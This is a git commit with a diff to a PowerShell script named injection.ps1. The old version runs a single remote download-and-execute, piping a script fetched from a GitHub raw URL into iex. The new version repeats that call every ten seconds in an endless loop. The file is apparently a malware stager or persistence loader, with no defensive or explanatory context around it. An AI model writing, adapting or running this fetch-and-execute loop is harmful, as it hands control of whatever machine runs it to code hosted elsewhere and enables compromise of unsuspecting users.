37916f9273abacf3deb61d368e321801c74b56fa
43a1723 <hai1723notgay@gmail.com>
2024-06-13 07:43:03 +0700

    Update injection.ps1

--- injection.ps1
+++ injection.ps1
@@ -1,1 +1,4 @@
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
+while ($true) {
+    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)
+    Start-Sleep -Seconds 10
+}
